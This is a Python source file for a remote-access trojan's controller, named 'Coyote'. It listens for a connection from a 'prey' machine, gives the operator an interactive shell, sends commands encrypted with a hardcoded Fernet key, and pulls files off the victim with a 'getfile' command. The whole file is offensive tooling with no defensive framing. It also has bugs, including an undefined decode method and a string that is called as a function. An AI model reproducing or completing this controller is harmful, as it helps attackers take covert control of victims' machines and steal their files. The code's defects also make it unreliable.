#-*-coding: utf-8-*-
from socket import *
from threading import Thread
from optparse import OptionParser as op
from platform import python_version as pv
from sys import argv
from cryptography.fernet import Fernet as fern
class Coyote:
	def __init__(self, ip, port, key):
		self.f = fern(key)
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.bind((ip, port))
		self.sock.listen(1)
		self.sock.settimeout(0.0)
		self.downloadfile = ""
		self.features = {"totallyhear" : True,"hear":True}
	def hearPrey(self):
		connection = False
		while self.features["totallyhear"]:
			try:
				self.conn, addr = self.sock.accept()
				self.conn.settimeout(0.0)
			except:
				pass
			else:
				connection = True
			while self.features["hear"] and connection:
				try:
					msj = self.conn.recv(1024)
					msj = self.decode(msj)
					if msj != "Sending file.":
						print(msj)
					else:
						self.downloadfile()
				except: 
					pass
	def shell(self):
		if pv()[0] == "3":
			raw_input = input
		cmd = ""
		while cmd != "exit":
			cmd = raw_input(">>>")
			if cmd[:7] == "getfile":
				self.downloadfile = cmd[8:]
			elif cmd[:7] == "turnoff":
				self.features[cmd[8:]] = False
				continue
			elif cmd[:6] == "turnon":
				self.features[cmd[9:]] = True
				continue
			self.send(cmd)
	def send(self, msj):
		if not type(msj) == type(b""):
			msj = msj.encode()
		msj = self.f.encrypt(msj)
		self.conn.send(msj)

def main():
	o = op("Usage: %prog [args] [values]")
	o.add_option("-H", "--host",dest="ip",default="127.0.0.1",help="Set your host.")
	o.add_option("-p", "--port",dest="port",default=5000,help="Set port.", type="int")
	o.add_option("-k", "--key", dest="key",default="FUYG1sNMAm-QVFJ02RMh6Bpms7bxZSMLmqjmnJXsO3w=",help="Set Fernet key")
	(opt, argv) = o.parse_args()
	c = Coyote(opt.ip,opt.port,opt.key)
	hear = Thread(target=c.hearPrey)
	hear.daemon = True
	hear.start()
	c.shell()
if __name__ == '__main__':
	main()